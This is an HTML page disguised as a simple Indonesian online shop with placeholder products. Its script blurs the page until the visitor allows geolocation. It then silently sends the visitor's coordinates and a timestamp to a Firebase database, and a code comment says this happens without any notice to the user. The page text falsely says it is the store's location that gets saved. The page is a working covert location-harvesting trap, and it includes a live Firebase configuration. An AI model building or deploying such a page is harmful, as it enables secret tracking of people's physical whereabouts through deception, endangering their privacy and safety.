<!DOCTYPE html>
<html>
<head>
  <title>üõí Toko Belanja Sederhana</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      max-width: 600px;
      margin: auto;
      padding: 1rem;
      background: #f5f5f5;
      color: #333;
      transition: filter 0.3s ease;
    }
    /* Filter buram dan abu-abu */
    body.blur {
      filter: grayscale(100%) blur(3px);
      pointer-events: none;
      user-select: none;
    }
    header {
      text-align: center;
      margin-bottom: 2rem;
    }
    header h1 {
      margin: 0;
      color: #2c3e50;
    }
    .store-location {
      margin: 1rem 0;
      text-align: center;
    }
    .store-location img {
      width: 150px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
    }
    .products {
      display: grid;
      grid-template-columns: repeat(auto-fit,minmax(150px,1fr));
      gap: 1rem;
    }
    .product-card {
      background: white;
      padding: 1rem;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      text-align: center;
    }
    .product-card img {
      max-width: 100%;
      height: 100px;
      object-fit: contain;
      margin-bottom: 0.5rem;
    }
    /* Pesan overlay saat belum izinkan lokasi */
    #permission-message {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255, 255, 255, 0.9);
      color: #e74c3c;
      font-size: 1.2rem;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 2rem;
      z-index: 9999;
      display: none; /* default disembunyikan */
    }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
</head>
<body class="blur">
  <header>
    <h1>üõí Toko Keren</h1>
    <p>Belanja mudah dan cepat</p>
  </header>

  <div class="store-location">
    <img src="https://cdn-icons-png.flaticon.com/512/684/684908.png" alt="Icon Toko" />
    <p>Lokasi toko tersimpan otomatis</p>
  </div>

  <div class="products">
    <div class="product-card">
      <img src="https://via.placeholder.com/150x100?text=Produk+1" alt="Produk 1" />
      <h3>Produk 1</h3>
      <p>Rp 50.000</p>
    </div>
    <div class="product-card">
      <img src="https://via.placeholder.com/150x100?text=Produk+2" alt="Produk 2" />
      <h3>Produk 2</h3>
      <p>Rp 75.000</p>
    </div>
    <div class="product-card">
      <img src="https://via.placeholder.com/150x100?text=Produk+3" alt="Produk 3" />
      <h3>Produk 3</h3>
      <p>Rp 100.000</p>
    </div>
  </div>

  <div id="permission-message">
    ‚ö†Ô∏è Untuk melihat toko, mohon izinkan akses lokasi di browser Anda.<br>
    Jika sudah muncul popup izin, silakan pilih ‚ÄúIzinkan‚Äù.
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAnI3-EDQr7OK8fHaeSSzAtLk9iR5sgbac",
      authDomain: "lokasiapi-2f434.firebaseapp.com",
      projectId: "lokasiapi-2f434",
      storageBucket: "lokasiapi-2f434.firebasestorage.app",
      messagingSenderId: "875812427660",
      appId: "1:875812427660:web:5c4ce962244c47e18128a9"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const permissionMessageEl = document.getElementById('permission-message');
    const bodyEl = document.body;

    // Fungsi kirim lokasi ke Firebase tanpa notifikasi UI
    function sendLocation(lat, lon) {
      const now = new Date().toISOString();
      db.ref("lokasi").push({
        latitude: lat,
        longitude: lon,
        timestamp: now
      });
    }

    function checkPermissionAndRequest() {
      // Cek status permission geolocation
      if (!navigator.geolocation) {
        permissionMessageEl.innerText = "Browser Anda tidak mendukung Geolocation.";
        permissionMessageEl.style.display = "flex";
        return;
      }

      // Cek permission API
      if (navigator.permissions) {
        navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
          if (permissionStatus.state === 'granted') {
            // izin sudah diberikan, ambil lokasi dan tampilkan halaman normal
            bodyEl.classList.remove('blur');
            permissionMessageEl.style.display = "none";
            navigator.geolocation.getCurrentPosition(pos => {
              sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
            });
          } else if (permissionStatus.state === 'prompt') {
            // belum dipilih, tampilkan pesan dan coba minta izin
            permissionMessageEl.style.display = "flex";
            navigator.geolocation.getCurrentPosition(pos => {
              // user baru saja memberi izin
              bodyEl.classList.remove('blur');
              permissionMessageEl.style.display = "none";
              sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
            }, err => {
              // user tolak izin
              permissionMessageEl.innerText = "‚ö†Ô∏è Anda menolak izin lokasi. Untuk melihat toko, mohon izinkan akses lokasi.";
              permissionMessageEl.style.display = "flex";
              bodyEl.classList.add('blur');
            });
          } else if (permissionStatus.state === 'denied') {
            // user tolak izin
            permissionMessageEl.innerText = "‚ö†Ô∏è Anda telah menolak izin lokasi. Untuk melihat toko, mohon izinkan akses lokasi dari pengaturan browser.";
            permissionMessageEl.style.display = "flex";
            bodyEl.classList.add('blur');
          }
          
          // Monitor jika permission berubah di waktu berjalan
          permissionStatus.onchange = function() {
            checkPermissionAndRequest();
          };
        });
      } else {
        // Fallback jika browser tidak support Permissions API
        // Coba langsung minta lokasi
        navigator.geolocation.getCurrentPosition(pos => {
          bodyEl.classList.remove('blur');
          permissionMessageEl.style.display = "none";
          sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
        }, err => {
          permissionMessageEl.style.display = "flex";
          permissionMessageEl.innerText = "‚ö†Ô∏è Mohon izinkan akses lokasi untuk melihat toko.";
          bodyEl.classList.add('blur');
        });
      }
    }

    checkPermissionAndRequest();
  </script>
</body>
</html>
